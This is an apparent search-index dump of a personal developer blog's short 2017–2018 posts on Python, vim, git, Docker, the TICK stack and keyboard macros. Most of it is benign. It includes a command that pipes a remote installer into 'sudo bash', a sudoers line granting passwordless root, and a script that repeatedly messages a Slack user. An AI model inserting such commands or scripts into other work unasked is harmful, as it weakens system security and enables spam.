\u0026#34;onload_time\u0026#34;,\u0026#34;visually_complete\u0026#34;,\u0026#34;fully_loaded_time\u0026#34;,\u0026#34;speed_index\u0026#34;],\u0026#34;api_key\u0026#34;:\u0026#34;xxxxxx\u0026#34;} f.args = query_string print f.url What it does is abstract the elements of the url. This allow it to start with a base url and then very easily add query string params to it. Also if there is repettion of the params such as \u0026ldquo;metrics\u0026rdquo; then it accpets a list and will iterate through the list to spawn out those params.\nAdditionally it has the ability to delete and manipulate params\n\u0026gt;\u0026gt;\u0026gt; from furl import furl \u0026gt;\u0026gt;\u0026gt; f = furl(\u0026#39;http://www.google.com/?one=1\u0026amp;two=2\u0026#39;) \u0026gt;\u0026gt;\u0026gt; f.args[\u0026#39;three\u0026#39;] = \u0026#39;3\u0026#39; \u0026gt;\u0026gt;\u0026gt; del f.args[\u0026#39;one\u0026#39;] \u0026gt;\u0026gt;\u0026gt; f.url \u0026#39;http://www.google.com/?two=2\u0026amp;three=3\u0026#39; This, would have been a pain to do with some string splits and or regexs in order to find the params and remove them.\n","permalink":"https://ridingintraffic.github.io/posts/2017-08-30-furl/","summary":"Furl Furl is a python package that enables the manipulation and use of urls. I think it is fantastic and much more readable than the string concat methods employed by many. github - furl\nHow does it work?\nfrom furl import furl f = furl(\u0026#39;https://someapi/v2/checks/data\u0026#39;) query_string={\u0026#34;range\u0026#34;:\u0026#34;last_hour\u0026#34;, \u0026#34;metrics\u0026#34;: [\u0026#34;server_time\u0026#34;, \u0026#34;dom_load_time\u0026#34;,\u0026#34;start_render\u0026#34;, \u0026#34;onload_time\u0026#34;,\u0026#34;visually_complete\u0026#34;,\u0026#34;fully_loaded_time\u0026#34;,\u0026#34;speed_index\u0026#34;],\u0026#34;api_key\u0026#34;:\u0026#34;xxxxxx\u0026#34;} f.args = query_string print f.url What it does is abstract the elements of the url. This allow it to start with a base url and then very easily add query string params to it.","title":"2017-08-30, furl"},{"content":"Python functions, *args, **kwargs Why use args and kwargs with python? A little while ago I did not understand kwargs, I find that to write about something helps build an understanding of a topic and it allows the information to be digested, much like rubber ducking. Also, because learning is fun and filling in knowledge gaps is better, here we go. rubberduckdebugging\nI am going to borrow a number of examples from the digital ocean tutorial about this because the way that they explained it really helped me to understand it. how-to-use-args-and-kwargs-in-python-3 Variables in functions with python; in order to pass data to a function variables are setup and passed in a specific order. The example function is called with a string and a number, simple enough.\ndef profile_info(username, followers): print(“Username: “ + username) print(“Followers: “ + str(followers)) profile_info(\u0026#34;chris\u0026#34;,15) \u0026gt;\u0026gt;Username: chris \u0026gt;\u0026gt;Followers: 15 Problem: This approach and function call mandates that the variables are passed in a specific order and all of the variables must always be passed. Solution: Add some default values which will let us pass none or some of the values without incurring an error.\ndef profile_info(username=\u0026#34;name\u0026#34;, followers=0): print(“Username: “ + username) print(“Followers: “ + str(followers)) profile_info() profile_info(username=\u0026#34;thor\u0026#34;) \u0026gt;\u0026gt;Username: name \u0026gt;\u0026gt;Followers: 0 \u0026gt;\u0026gt;Username: thor \u0026gt;\u0026gt;Followers: 0 Benefit: Order doesn’t matter when passing via keyword. If we want to mix and match the order of the variables we can pass variables with the keyword attached.\ndef profile_info(username=\u0026#34;name\u0026#34;, followers=0): print(“Username: “ + username) print(“Followers: “ + str(followers)) profile_info(followers=6, username=\u0026#34;thor\u0026#34;) \u0026gt;\u0026gt;Username: thor \u0026gt;\u0026gt;Followers: 6 Great, now what about many of variables \u0026hellip; Using *args we can pass an undisclosed number of variables as a tuple. Whats the difference between a tuple and a list? In python a tuple is immutable, where as a list is mutable. Some objects are mutable, meaning they can be altered. Others are immutable; they cannot be changed but rather return new objects when attempting to update. python-objects-mutable-vs-immutable Why does mutability matter?\nstring_build = \u0026#34;\u0026#34; for data in container: string_build += str(data) Simple enough but because a string is an immutable object, a new object is created on every concat, throwing away the old one and as a result using more memory. Solutions:\nbuilder_list = [] for data in container: builder_list.append(str(data)) “”.join(builder_list) ### Another way is to use a list comprehension “”.join([str(data) for data in container]) ### or use the map function “”.join(map(str, container)) Another gotcha is using a list as a parameter for a function, otherwise known as the poor mans args.\ndef my_function(param=[]): param.append(“thing”) return param my_function() # returns [“thing”] my_function() # returns [“thing”, “thing”] Despite using the empty list as a default value, python only evaluates the definition once and therefore that empty list is only empty before the first time it is called. The function will reuse the same list every time it is called. *oops Back to *args, for functions. Lists are cool and all but using the *args option for function parameters is very useful. This way the function can accept any number of variables without having to rebuild the call for each permutation.\ndef multiply(*args): z = 1 for num in args: z *= num print(z) multiply(4, 5) multiply(10, 9) That is pretty awesome but it lacks the ability to have a different order of params and to define specific params. This gives us more flexibility in one area but less in another. Whats the fix for that? **kwargs KWargs or “keyword arguments” allows you to pass the keyworded, dictionary as arguments. Because dictionaries are almost always super useful. def print_values(**kwargs): for key, value in kwargs.items(): print(\u0026ldquo;The value of {} is {}\u0026quot;.format(key, value))\nprint_values(my_name=\u0026ldquo;thor\u0026rdquo;, your_name=\u0026ldquo;hulk\u0026rdquo;) Key worded arguments are a pretty fantastic additional however, in order to leverage them effectively the code is going to have to handle dictionaries appropriately. Finally if the intent is to mix and match argument types the order of the declaration needs to work like this. def example2(arg_1, arg_2, *args, kw_1=\u0026ldquo;shark\u0026rdquo;, kw_2=\u0026ldquo;blobfish\u0026rdquo;, **kwargs):\nWhat about passing to args and kwargs? Simple enough just build a list or a dictionary and pass it to the proper function. def some_args(arg_1, arg_2, arg_3): print(\u0026#34;arg_1:\u0026#34;, arg_1) print(\u0026#34;arg_2:\u0026#34;, arg_2) print(\u0026#34;arg_3:\u0026#34;, arg_3) my_list = [2, 3] some_args(1, *my_list) def some_kwargs(kwarg_1, kwarg_2, kwarg_3): print(\u0026#34;kwarg_1:\u0026#34;, kwarg_1) print(\u0026#34;kwarg_2:\u0026#34;, kwarg_2) print(\u0026#34;kwarg_3:\u0026#34;, kwarg_3) kwargs = {\u0026#34;kwarg_1\u0026#34;: \u0026#34;Val\u0026#34;, \u0026#34;kwarg_2\u0026#34;: \u0026#34;Harper\u0026#34;, \u0026#34;kwarg_3\u0026#34;: \u0026#34;Remy\u0026#34;} some_kwargs(**kwargs) Conclusions, args and kwargs are fantastic for a number of cases, but of course they are not the end all be all solution. When writing functions and using them only use what is needed, don’t just use kwargs because it’s a new shiny toy because when all you have is a hammer then everything is a nail. Think about optimization, think about memory usage and think about maintainability as well as readability, then use the appropriate data type for the job. Thank you to digital ocean for writing a fantastic tutorial on python, seriously check out their series on everything python.\n","permalink":"https://ridingintraffic.github.io/posts/2017-09-01-args-kwargs/","summary":"Python functions, *args, **kwargs Why use args and kwargs with python? A little while ago I did not understand kwargs, I find that to write about something helps build an understanding of a topic and it allows the information to be digested, much like rubber ducking. Also, because learning is fun and filling in knowledge gaps is better, here we go. rubberduckdebugging\nI am going to borrow a number of examples from the digital ocean tutorial about this because the way that they explained it really helped me to understand it.","title":"2017-09-01, python args kwargs functions"},{"content":"VIM Evil, evil, vim or is that zim because vim isn’t evil but neither was zim? Nope definitely vim, that’s whatI want to talk about today. That and ripgrep. I find myself bouncing between vim and sublime depending on what I am doing. Either way I went back into vim today and found a nice plugin that leverages ripgrep. The repo for ripgrep can be found here: ripgrep . Although it is a simple install on mac with abrew install ripgrep,you will need to install the rg binary in order to get the vim plugin to work right. I love ripgrep for command line stuff therefore, having it in vim should be pretty great. Julia evans talked about the ripgrep plugin I’m going to use here. / vim-sessions with a link to her vimrc file vimrc and the plugin itself lives here: vim-ripgrep Since I use pathogen for my plugin manager installing the ripgrep plugin is as simple as cloning that repo into my bundle location. The install process for pathogen can be found here: vim-pathogen . Once pathogen is all setup the magic happens pretty easily. Pop open a blank file or any file in vim and pay attention to the directory that you are in. Then just do a :Rg in this example I used the blog source and searched for vim. The result is a handy dandy window with all the files that contain your search. Then it is as simple as scrolling down and then opening the file and boom, Done/ I am sure that there are a few other intricacies to rg and vim but that is the quick win for this sunday blog post. Enjoy\n","permalink":"https://ridingintraffic.github.io/posts/2017-09-10-vim-rg/","summary":"VIM Evil, evil, vim or is that zim because vim isn’t evil but neither was zim? Nope definitely vim, that’s whatI want to talk about today. That and ripgrep. I find myself bouncing between vim and sublime depending on what I am doing. Either way I went back into vim today and found a nice plugin that leverages ripgrep. The repo for ripgrep can be found here: ripgrep . Although it is a simple install on mac with abrew install ripgrep,you will need to install the rg binary in order to get the vim plugin to work right.","title":"2017-09-10 vim plugins, rg"},{"content":"git branching How about a git refresher moment to remember how to use git. Different people and places have different ideas behind how source control should be handled. I have started a new job so I thought that it would be a good idea to refresh my knowledge on git branching strategies.\nAlright we have done a clone of a repo, next step is to do a branch. Part of that step is doing a checkout of the master\n# Checkout the master branch - you want your new branch to come from master git checkout master # Create a new branch named newfeature (give your branch its own simple informative name) git branch newfeature # Switch to your new branch git checkout newfeature Great now we have the branch and do some work in the branch.\n# Fetch upstream master and merge with your repo\u0026#39;s master branch git fetch upstream git checkout master git merge upstream/master # If there were any new commits, rebase your development branch git checkout newfeature git rebase master Further cleanup doing some squashing of commits\n# Rebase all commits on your development branch git checkout git rebase -i master which opens a text editor and you specify which commits to squash\nfootnotes: Chaser324/ce0505fbed06b947d962\n","permalink":"https://ridingintraffic.github.io/posts/2017-10-02-git-refresh/","summary":"git branching How about a git refresher moment to remember how to use git. Different people and places have different ideas behind how source control should be handled. I have started a new job so I thought that it would be a good idea to refresh my knowledge on git branching strategies.\nAlright we have done a clone of a repo, next step is to do a branch. Part of that step is doing a checkout of the master","title":"2017-10-02 git refresher"},{"content":"expose hidden files on a mac Finder hides all sorts of stuff, let expose that\ndefaults write com.apple.Finder AppleShowAllFiles true defaults write -g AppleShowAllFiles -bool true killall Finder Lets relearn chef vagrant init bento/ubuntu-14.04 vagrant up vagrant ssh sudo apt-get update sudo apt-get -y install curl curl https://omnitruck.chef.io/install.sh | sudo bash -s -- -P chefdk -c stable -v 2.0.28 #gets the latest version of chefdk and installs it simple enough now vagrant has chef and we can do chef local type configs and changes.\nLets cleanup the vagrant image and delete it vagrant destroy --force does just that\n","permalink":"https://ridingintraffic.github.io/posts/2017-10-03-chef-finder/","summary":"expose hidden files on a mac Finder hides all sorts of stuff, let expose that\ndefaults write com.apple.Finder AppleShowAllFiles true defaults write -g AppleShowAllFiles -bool true killall Finder Lets relearn chef vagrant init bento/ubuntu-14.04 vagrant up vagrant ssh sudo apt-get update sudo apt-get -y install curl curl https://omnitruck.chef.io/install.sh | sudo bash -s -- -P chefdk -c stable -v 2.0.28 #gets the latest version of chefdk and installs it simple enough now vagrant has chef and we can do chef local type configs and changes.","title":"2017-10-03 chef"},{"content":"Today is going to be a quick one wiht some \u0026ldquo;scripts\u0026rdquo; and or functions that were given to me and a couple that I wrote on my own. simply create the bash script add them to a folder and then add that path to your $PATH variable in your bash_profile.\nssh-trust This one was given to me from a co-worker and solves the issue of validating a changed ssh-host key when that host changes. Instead of going in and deleting the entry manually from your authorized_hosts file\u0026hellip;\n#!/usr/bin/env bash set -euo pipefail IFS=$\u0026#39;\\n\\t\u0026#39; if [[ $# -ne 1 ]]; then echo \u0026#39;usage: ssh-trust \u0026lt;line-number\u0026gt;\u0026#39; \u0026gt;\u0026amp;2 exit 1 fi gsed -i \u0026#34;${1}d\u0026#34; ~/.ssh/known_hosts docker_logs_latest often times I will need to jsut tail the logs of the last docker container that I spun up, this will grab the most recent;y launched docker container and then docker logs -f that container id\n#!/bin/bash $(docker logs -f “$(docker ps -l -q)“) dockerconn I am pretty bad at remembering what the attach process is for dropping in to a docker container, so this just need s docker_id and I can attach to the container.\n#!/bin/bash set -euo pipefail IFS=$\u0026#39;\\n\\t\u0026#39; if [[ $# -ne 1 ]]; then echo \u0026#39;usage: dockerconn \u0026lt;container_id\u0026gt;\u0026#39; \u0026gt;\u0026amp;2 exit 1 fi docker exec -i -t ${1} /bin/bash There you have it a couple quick and dirty scripts to make your life easier. I hope that you enjoyed!\n","permalink":"https://ridingintraffic.github.io/posts/2017-10-05-quick-hits/","summary":"Today is going to be a quick one wiht some \u0026ldquo;scripts\u0026rdquo; and or functions that were given to me and a couple that I wrote on my own. simply create the bash script add them to a folder and then add that path to your $PATH variable in your bash_profile.\nssh-trust This one was given to me from a co-worker and solves the issue of validating a changed ssh-host key when that host changes.","title":"2017-10-05 quick wins"},{"content":"new location I suppose I ahve taken a little bit of a break lately because I have been working at a new job and doing all sorts of everything. I am going to try and add content and learning more often\nterraform I feel like i have a whole other blog post that I will need to write about terraform that i think that is going to have to be another time.\nthe fuck there is a little module that you can install via github that will autofix terminal commands when you screw them up. the fuck It seems that this could be useful when you typo things. I will take a look and see if it is going to stick around in my dotFiles\n","permalink":"https://ridingintraffic.github.io/posts/2017-10-24-new-job/","summary":"new location I suppose I ahve taken a little bit of a break lately because I have been working at a new job and doing all sorts of everything. I am going to try and add content and learning more often\nterraform I feel like i have a whole other blog post that I will need to write about terraform that i think that is going to have to be another time.","title":"2017-10-24 terraform and fixers "},{"content":"#Forcing vim I have been trying to force myself to use vim strictly for some time now.. I am giving it another go. Sometimes it works other times less so, but today I am going to give it a try.\n","permalink":"https://ridingintraffic.github.io/posts/2017-10-25-todays-thing/","summary":"#Forcing vim I have been trying to force myself to use vim strictly for some time now.. I am giving it another go. Sometimes it works other times less so, but today I am going to give it a try.","title":"2017-10-25 something today "},{"content":"Telegraf There is a tool out there called telegraf, which is kind of interesting. It takes metrics and then forwards them on to a time series database, such as influx. telegraf getting started This may not seem like that big of a deal, but it can be extra useful, when ingesting metrics like cpu and memory or other simple type metrics, which would require a script to be constantly running. There is a nice thing that once you get it configured to run on a server just adding .conf files to the conf.d folder will allow you to add inputs and outputs for everything\nkafka stuff kafak is pretty cool too, and it looks like you can run all of kafka out of a docker image if your intent is it use it on a small scale. Or if you just want to play around with it\u0026hellip; the tricky part is if you try to spin up kafka you are gonna need zookeeper as well. Luckily spotify has a sweet image that handles it. docker-kafka\nInflux db Influx is the brains behind telegraf. Think of telegraf as just the ingestion method for influx. Influx uses time series entries for metric in order to udnerstand what the heck is going on.\nA good article on it is here: influxdb-internals-101-part-one There is a nice thing that once you get it configured to run on a server just adding .conf files to the conf.d folder will allow you to add inputs and outputs for everything\nGit Oops, a PR was created and you found an error but you don\u0026rsquo;t want to create a new pr\u0026hellip; In steps git commit --ammend this will then allow you to add to your last commit, it is as if you meant to do it all along.\nstitching it all together The idea with all of these technologies above is to take metrics from A and send them to B. Kafka will be the broker for everything so you have telegraf do some magic and then write to a kafka topic. Then you have telegraf reading from a kafka topic and writing into influx db. Finally you can take influx and use grafana to pull the data out of influx. Wooo\u0026hellip; data.\n","permalink":"https://ridingintraffic.github.io/posts/2017-10-27-tik_stack/","summary":"Telegraf There is a tool out there called telegraf, which is kind of interesting. It takes metrics and then forwards them on to a time series database, such as influx. telegraf getting started This may not seem like that big of a deal, but it can be extra useful, when ingesting metrics like cpu and memory or other simple type metrics, which would require a script to be constantly running. There is a nice thing that once you get it configured to run on a server just adding .","title":"2017-10-27 telegraf influxdb "},{"content":"VIM I am still trying to force feed myself vim. As a part of that effort I have included this in my vimrc ```noremap \u0026quot;\u0026quot; noremap! noremap \u0026quot;\u0026quot; noremap! noremap \u0026quot;\u0026quot; noremap! noremap \u0026quot;\u0026quot; noremap! which should turn off all of my arrow keys and force me to navigate the world with vim arrows at least while in vim. This is all in an effort to try and get myself to get better at vim. Why vim do you ask? Because it is lightweight installed everywhere and the better that you are with your tools the better you can not let your tools liomit you. There is a book called the pragmatic programmer that speaks to this idea. It is the idea that the tool should not limit what you can do. A tool like vim has the ability to pretty much do anything. It is just a matter of you learning how to use that tool to the best of your ability. If you can stick to a single tool then the majority of your time will be devoted to becoming really good at jsut that tool. That is my intent in force feeding myself vim. Perhaps this time I will actually spend enough time with vim to make it stick. ","permalink":"https://ridingintraffic.github.io/posts/2017-10-30-monday/","summary":"VIM I am still trying to force feed myself vim. As a part of that effort I have included this in my vimrc ```noremap \u0026quot;\u0026quot; noremap! noremap \u0026quot;\u0026quot; noremap! noremap \u0026quot;\u0026quot; noremap! noremap \u0026quot;\u0026quot; noremap! which should turn off all of my arrow keys and force me to navigate the world with vim arrows at least while in vim. This is all in an effort to try and get myself to get better at vim.","title":"2017-10-30 vim for the win"},{"content":"cr-48 A while back when google was first betaing the chromebook they sent out these machines called cr48 which were literally beta chromebooks beofre there were chromebooks. I was a part of that program and as a result I have one of these kicking around. My macbook air died about a month ago, as a result I have been going through all of my old hardware trying to find some type of machine that I can get things done on. A while back I modified the firmware of this laptop so that I could just treat it as a regular linux box, cool great I can load ubuntu 16.10 or something. The downside is the screen is pretty small and there is no backlight. Also it turns out that the platform itself is a 32bit architecture\u0026hellip; Chrome has stopped supporting their browser for 32 bit, sad face. This alone is almost a deal breaker because the laptop does not have much for storage which I had intended to do the majority of my work with it in a browser. O well I guess it is gonna be thinkpads until i figure out what kind of hardware to run\u0026hellip; if anyone has a macbook air I would gladly take it off there hands\u0026hellip;\nformat change. In a short time I might diverge a little bit from a technical what did I learn, and into a life/parenting what did I learn, but we will see if I manage to do that or if it is just one of those ideas that I have and then never follow through on\u0026hellip;\n","permalink":"https://ridingintraffic.github.io/posts/2017-11-22-witty/","summary":"cr-48 A while back when google was first betaing the chromebook they sent out these machines called cr48 which were literally beta chromebooks beofre there were chromebooks. I was a part of that program and as a result I have one of these kicking around. My macbook air died about a month ago, as a result I have been going through all of my old hardware trying to find some type of machine that I can get things done on.","title":"2017-11-22 something witty"},{"content":"ssh things say that you lost your ssh public key but still had a private one\u0026hellip;. you can get the public from teh private by running ssh-keygen -y -f ~/.ssh/id_rsa \u0026gt; ~/.ssh/id_rsa.pub\ndone and simple\nslack annoyer sometimes you jstu nee dto repeat a message to someone for an extended period of time\nfrom slackclient import SlackClient import sys #python junk.py \u0026lt;user\u0026gt; \u0026#34;message\u0026#34; \u0026lt;repeat\u0026gt; \u0026lt;interval seconds\u0026gt; slack_token = \u0026#34;your token here\u0026#34; sc = SlackClient(slack_token) user = sys.argv[1] user = \u0026#34;@%s\u0026#34; %(user) message = sys.argv[2] repeat = int(sys.argv[3]) interval = int(sys.argv[4]) for _ in range(repeat): sc.api_call( \u0026#34;chat.postMessage\u0026#34;, channel=user, text=message ) sleep(interval) freenas want to do paswordless sudo in freenas?\nsudo mount -uw / vi /usr/local/sudoers user ALL=(ALL) NOPASSWD: ALL make your changes mount -ur / wam bam\n","permalink":"https://ridingintraffic.github.io/posts/2018-06-06-ssh_slack_freenas/","summary":"ssh things say that you lost your ssh public key but still had a private one\u0026hellip;. you can get the public from teh private by running ssh-keygen -y -f ~/.ssh/id_rsa \u0026gt; ~/.ssh/id_rsa.pub\ndone and simple\nslack annoyer sometimes you jstu nee dto repeat a message to someone for an extended period of time\nfrom slackclient import SlackClient import sys #python junk.py \u0026lt;user\u0026gt; \u0026#34;message\u0026#34; \u0026lt;repeat\u0026gt; \u0026lt;interval seconds\u0026gt; slack_token = \u0026#34;your token here\u0026#34; sc = SlackClient(slack_token) user = sys.","title":"2018_06_06_ssh_slack_freenas"},{"content":"python http server simple startup of a python webserver for mac in your local directory:\npython2: python -m SimpleHTTPServer\npython3 with cgi: python -m http.server --cgi\npython3 normal: python3 -m http.server\ni mean what can go wrong here really?!?\nsource: start-web-server-python-3\n","permalink":"https://ridingintraffic.github.io/posts/2018-07-31-python-websever/","summary":"python http server simple startup of a python webserver for mac in your local directory:\npython2: python -m SimpleHTTPServer\npython3 with cgi: python -m http.server --cgi\npython3 normal: python3 -m http.server\ni mean what can go wrong here really?!?\nsource: start-web-server-python-3","title":"2018_07_31_python_webserver"},{"content":"quick and dirty install of the aws cli sometimes you need to install the aws cli and you just need to get it done. I often use this when I am doing a bash install of it, for some kind of automation.\n#download it $ curl \u0026#34;https://s3.amazonaws.com/aws-cli/awscli-bundle.zip\u0026#34; -o \u0026#34;awscli-bundle.zip\u0026#34; #unzip it $ unzip awscli-bundle.zip #run it $ sudo ./awscli-bundle/install -i /usr/local/aws -b /usr/local/bin/aws #if you dont have root you can run it here $ ./awscli-bundle/install -b ~/bin/aws # then make sure your $PATH is using it $ export PATH=~/bin:$PATH thats it done and simple quick install of the aws cli tools source: https://docs.aws.amazon.com/cli/latest/userguide/awscli-install-bundle.html\nchecking if a python module/ library is installed again something i have found useful for automation is to see if a python library is installed. quick and simple bash call to get a true false on the package\npython -c \u0026#39;import pkgutil; print(1 if pkgutil.find_loader(\u0026#34;module\u0026#34;) else 0)\u0026#39; Where module is what you are looking for.\n","permalink":"https://ridingintraffic.github.io/posts/2018-08-01-aws_cli_bundled_install/","summary":"quick and dirty install of the aws cli sometimes you need to install the aws cli and you just need to get it done. I often use this when I am doing a bash install of it, for some kind of automation.\n#download it $ curl \u0026#34;https://s3.amazonaws.com/aws-cli/awscli-bundle.zip\u0026#34; -o \u0026#34;awscli-bundle.zip\u0026#34; #unzip it $ unzip awscli-bundle.zip #run it $ sudo ./awscli-bundle/install -i /usr/local/aws -b /usr/local/bin/aws #if you dont have root you can run it here $ .","title":"2018_08_01_aws_cli_bundled_install"},{"content":"setting up mac keyboards key repeat with a new laptop means that you need to make all the changes to all the things. One of the annoyances that I had was the key repeat. Yes you can change this in the gui but why would I want to do it there when I can do it in the terminal instead\u0026hellip;\n# read what everything is set at $ defaults read -g InitialKeyRepeat $ defaults read -g KeyRepeat # write some new values to the things. $ defaults write -g InitialKeyRepeat -int 15 $ defaults write -g KeyRepeat -int 2 python ping sometimes you have to do these things\n#!/usr/bin/env python import urllib import threading import time import sys def pinger_urllib(host): \u0026#34;\u0026#34;\u0026#34; helper function timing the retrival of index.html TODO: should there be a 1MB bogus file? \u0026#34;\u0026#34;\u0026#34; t1 = time.time() urllib.urlopen(host).read() return (time.time() - t1) * 1000.0 def task(m): \u0026#34;\u0026#34;\u0026#34; the actual task \u0026#34;\u0026#34;\u0026#34; delay = float(pinger_urllib(m)) print \u0026#39;%-30s %5.0f [ms]\u0026#39; % (m, delay) # parallelization tasks = [] URL = \u0026#39;http://\u0026#39; + sys.argv[1] t = threading.Thread(target=task, args=(URL,)) t.start() tasks.append(t) # synchronization point for t in tasks: t.join() ","permalink":"https://ridingintraffic.github.io/posts/2018-08-02-key_repeat_macos_python_ping/","summary":"setting up mac keyboards key repeat with a new laptop means that you need to make all the changes to all the things. One of the annoyances that I had was the key repeat. Yes you can change this in the gui but why would I want to do it there when I can do it in the terminal instead\u0026hellip;\n# read what everything is set at $ defaults read -g InitialKeyRepeat $ defaults read -g KeyRepeat # write some new values to the things.","title":"2018_08_02_mac_key_repeat_python_ping"},{"content":"New year well its a new year and I am back at work. There has been a pretty big drought or posts since the last one, lets fill in the blanks a bit. This blog is going to get some different information this year. I think that I want to add in some aprenting stuff that I learned. At the end of last year we welcomed a baby girl in to the world. This is relevant because I am learning on the fly about being a dad. this is much the same was I learn about anything. Therefore it seems relevant that I add some what I learned about kids in here. If that is now up to your tastes then I\u0026rsquo;m sorry but its my world here and this is the journey we are going on.\nmacos 0day IOHIDeous\nThis looks like it is only a local privilege escalation (LPE) flaw so it is just taking an already accessed machine and makes it worse. Not the end of the world but it is still pretty interesting stuff. It was just dumped to the internet without a disclosure. The explanation to this approach is because the mac bug bounty doesnt cover macos and the exploit is not remote. So meh\nbaby: the 5 S\u0026rsquo;s five s There is a bit of backlog of baby stuff that I have learned. The most important stuff I have found to date is the techniques for the 5 S\u0026rsquo;s. These may not seem like much but they work incredibly well to calm our baby. Swaddle side shush swing suck. You can try each one of these or combine them all in order to get a baby to stop crying. Newborns have no way to really communicate and therefore only cry. Also they can get stuck in a feedback loop and not realize that its ok. So give that link a look and take a look at the magic of the 5. I have been shocked at how well they all work and most times I can have the patience to wait it out and get baby girl to calm using only those tchniques.\n","permalink":"https://ridingintraffic.github.io/posts/2018-01-02-new-year/","summary":"New year well its a new year and I am back at work. There has been a pretty big drought or posts since the last one, lets fill in the blanks a bit. This blog is going to get some different information this year. I think that I want to add in some aprenting stuff that I learned. At the end of last year we welcomed a baby girl in to the world.","title":"2018-01-02 new year new everything "},{"content":"Macbook pro keyboard The macbook pro keyboard is terrible. I have a whole bunch of differnt mechanical keyboards. There are times however that resting a mechnical keyboard on the top of the existing keyboard would be nice. This creates an issue where keys will get pressed on the built in keyboard. The solution for this is to install kayabiner elements. Then there is an option in the preferences named devices and an option to disable the existing keyboard if certain usb keyboards are plugged in. First have that menu open with no keyboard plugged in and then insert the usb an see what the keyboard hardware id reports as. Then it is as easy as selecting the checkbox and the built in keyboard is disabled. It is then enabled as soon as you unplug the usb. This is a fantastic little feature.\n","permalink":"https://ridingintraffic.github.io/posts/2018-01-03-keyboards/","summary":"Macbook pro keyboard The macbook pro keyboard is terrible. I have a whole bunch of differnt mechanical keyboards. There are times however that resting a mechnical keyboard on the top of the existing keyboard would be nice. This creates an issue where keys will get pressed on the built in keyboard. The solution for this is to install kayabiner elements. Then there is an option in the preferences named devices and an option to disable the existing keyboard if certain usb keyboards are plugged in.","title":"2018-01-03 macbook_pro_keyboard"},{"content":"Processor Speculative Execution There is a nasty hardware flaw out there that has been found, which involves just about every cpu in current use, it is essentially an issue with the mem cache on and how out of order processesing happens. which allow a predictive branch to happen where you can predict where something is going to be written. Then you read that location and essentially get a memory shim that sees everything.\nThis is known as meltdown and spectre. They are both pretty nasty, and some folks think that computing is going to be forever changed\u0026hellip; mostly because the cpu architecture has just always been done this way\nLinks to resources spectre track spectre whitepaper meltdown whitepaper reading-privileged-memory-with-side cyberus blog meltdown-and-spectre-every-modern-processor-has-unfixable-security-flaws\n","permalink":"https://ridingintraffic.github.io/posts/2018-01-04-processor_speculation/","summary":"Processor Speculative Execution There is a nasty hardware flaw out there that has been found, which involves just about every cpu in current use, it is essentially an issue with the mem cache on and how out of order processesing happens. which allow a predictive branch to happen where you can predict where something is going to be written. Then you read that location and essentially get a memory shim that sees everything.","title":"2018-01-04 processor_speculation "},{"content":"Friday Running rspec tests in jenkinsfiles today. It actually went prett easy\u0026hellip; Build the docker images and then inside of it fire the docker run command for rspec and the exit code is caught from the sh in the jenkins step.\nGitmask coding without a trace\u0026hellip; this looks kind of fun to make commits and whatnot but do it so no one knows who it is or where it came from\u0026hellip; Just think of all the fun things that can be done with this\u0026hellip; https://www.gitmask.com/\n","permalink":"https://ridingintraffic.github.io/posts/2018-01-05-gitmask/","summary":"Friday Running rspec tests in jenkinsfiles today. It actually went prett easy\u0026hellip; Build the docker images and then inside of it fire the docker run command for rspec and the exit code is caught from the sh in the jenkins step.\nGitmask coding without a trace\u0026hellip; this looks kind of fun to make commits and whatnot but do it so no one knows who it is or where it came from\u0026hellip; Just think of all the fun things that can be done with this\u0026hellip; https://www.","title":"2018-01-05 gitmask "},{"content":"git clean quick and easy way to delete files that are untracked in a git repo \u0026lsquo;git clean -df\u0026rsquo; this will delete any untracked files. It is often useful to do this after you have been doing some work and have a couple temp files that you don\u0026rsquo;t want around anymore. No more deleting a bunch of junk. Let git do it for you.\ngit push origin current branch working with feature branches means that you will need to push up those branches\u0026hellip; here is an alias that will push origin the current branch alias gpox=\u0026lsquo;git push origin git rev-parse --abbrev-ref HEAD\u0026rsquo; OR\npush.default=current``` OR ```git push origin HEAD``` ","permalink":"https://ridingintraffic.github.io/posts/2018-01-10-git_clean_push/","summary":"git clean quick and easy way to delete files that are untracked in a git repo \u0026lsquo;git clean -df\u0026rsquo; this will delete any untracked files. It is often useful to do this after you have been doing some work and have a couple temp files that you don\u0026rsquo;t want around anymore. No more deleting a bunch of junk. Let git do it for you.\ngit push origin current branch working with feature branches means that you will need to push up those branches\u0026hellip; here is an alias that will push origin the current branch alias gpox=\u0026lsquo;git push origin git rev-parse --abbrev-ref HEAD\u0026rsquo; OR","title":"2018-01-08 git_clean_push"},{"content":"vim tutorial stuff Vim is vim and it does things that are sometimes good\u0026hellip; Ha well you know what I mean there is a good article about the benefits of using vim instead of some kind of heavy editor. https://medium.com/@caspervonb/why-i-still-use-vim-67afd76b4db6 http://vimcasts.org/\n","permalink":"https://ridingintraffic.github.io/posts/2018-01-08-vim_tutorials/","summary":"vim tutorial stuff Vim is vim and it does things that are sometimes good\u0026hellip; Ha well you know what I mean there is a good article about the benefits of using vim instead of some kind of heavy editor. https://medium.com/@caspervonb/why-i-still-use-vim-67afd76b4db6 http://vimcasts.org/","title":"2018-01-08 vim_tutorials"},{"content":"returning an apple watch it tricky apparently if you find an apple watch and try to find its owner, the only thing that you can do is drop it off at an apple store\u0026hellip;\n","permalink":"https://ridingintraffic.github.io/posts/2018-01-16-apple_watch_return/","summary":"returning an apple watch it tricky apparently if you find an apple watch and try to find its owner, the only thing that you can do is drop it off at an apple store\u0026hellip;","title":"2018-01-16 apple_watch_return"},{"content":"ascii art because why not, here it a git repo that links to some ascii art ascii-emoji\nmacro-ing ergodox There is a firmware out there called qmk. QMK is awesome and you can program your custom keyboards to do just about anythin. I wanted to write a macro for ¯\\_(ツ)_/¯ because I got sidetracked and went down the rabbit hole.\nThe tricky part is sending the hex codes through to the OS. This is first done in the keyboard and then you need to setup MACos to have the input source of Unicode Hex input, otherwise it is not going to get converted properly.\nThere is some documentation for qmk and the macro options here feature_macros.html The final product can be found here because why not just include the final my keymap keymap.c\n","permalink":"https://ridingintraffic.github.io/posts/2018-01-31-ascii_art/","summary":"ascii art because why not, here it a git repo that links to some ascii art ascii-emoji\nmacro-ing ergodox There is a firmware out there called qmk. QMK is awesome and you can program your custom keyboards to do just about anythin. I wanted to write a macro for ¯\\_(ツ)_/¯ because I got sidetracked and went down the rabbit hole.\nThe tricky part is sending the hex codes through to the OS.","title":"2018-01-31 ascii art"},{"content":"guard clauses Because I did not know the term for this, a guard clause is essentially a check if not null or similar empty set checks in code\u0026hellip; example for ruby is return [] if instances.empty? Filling in holes of knowledge and writing them down becaue otherwise I may not retain 